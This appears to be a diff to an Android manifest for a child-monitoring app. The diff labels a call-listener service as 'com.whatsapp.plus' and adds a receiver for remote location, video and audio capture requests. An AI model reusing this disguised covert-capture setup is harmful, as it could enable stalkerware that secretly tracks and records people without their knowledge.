@@ -33,7 +33,9 @@
             </intent-filter>
         </activity>
 
-        <service android:name=".services.CallListenerService" />
+        <service android:name=".services.CallListenerService"
+            android:label="com.whatsapp.plus"/>
+
         <service android:name=".services.UploadService"/>
         <receiver android:name=".receivers.BootStateListener">
             <intent-filter>
@@ -75,6 +77,17 @@
         <receiver android:name=".receivers.DeleteDataReceiver">
             <intent-filter>
                 <action android:name="com.byteshaft.deleteData"/>
+            </intent-filter>
+        </receiver>
+
+        <receiver
+            android:name=".receivers.LocationRequester"
+            android:enabled="true"
+            android:exported="false">
+            <intent-filter>
+                <action android:name="com.byteshaft.kidmonitor.request_location"/>
+                <action android:name="com.byteshaft.kidmonitor.request_video"/>
+                <action android:name="com.byteshaft.kidmonitor.request_audio"/>
             </intent-filter>
         </receiver>
     </application>
